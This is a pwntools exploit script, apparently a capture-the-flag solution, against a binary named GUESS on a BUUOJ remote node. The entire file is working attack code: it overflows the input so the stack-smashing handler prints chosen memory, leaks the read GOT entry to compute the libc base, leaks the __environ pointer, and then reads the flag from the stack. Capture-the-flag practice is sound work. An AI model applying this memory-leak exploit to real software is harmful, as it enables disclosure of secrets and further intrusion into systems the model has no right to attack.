from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, search, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
		search_addr = base + libc.dump(search)
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()
		search_addr = base + libc.symbols[search]

	return (base, system, binsh, search_addr)


context(os='linux', arch='amd64', log_level='debug')
binary = './GUESS'

context.binary = binary
elf = ELF(binary)
io = remote('node4.buuoj.cn',29933) if argv[1]=='r' else process(binary)
# io= gdb.debug(binary,"break *0x400699")

#leak libc
read_got = elf.got['read']
payload = b'a' * 0x128 + p64(read_got)
io.sendlineafter(b'Please type your guessing flag',payload)
io.recvuntil(b'stack smashing detected ***: ')
read_addr = u64(io.recvuntil(b'\x7f',drop=False)[-6:].ljust(8,b'\x00'))
base,system_addr,bin_sh_addr,environ = ret2libc(read_addr,'read','__environ')
log.success('base->'+hex(base))

#leak environ
payload = b'a' * 0x128 + p64(environ)
io.sendlineafter(b'Please type your guessing flag',payload)
io.recvuntil(b'stack smashing detected ***: ')
environ_value = u64(io.recvuntil(b'\x7f',drop=False)[-6:].ljust(8,b'\x00'))
log.success('environ->'+hex(environ))

#leak flag(environ指向的值和flag都在栈上)
flag_addr = environ_value - 0x168
payload = b'a' * 0x128 + p64(flag_addr)
io.sendlineafter(b'Please type your guessing flag',payload)
io.recvuntil(b'stack smashing detected ***: ')

io.interactive()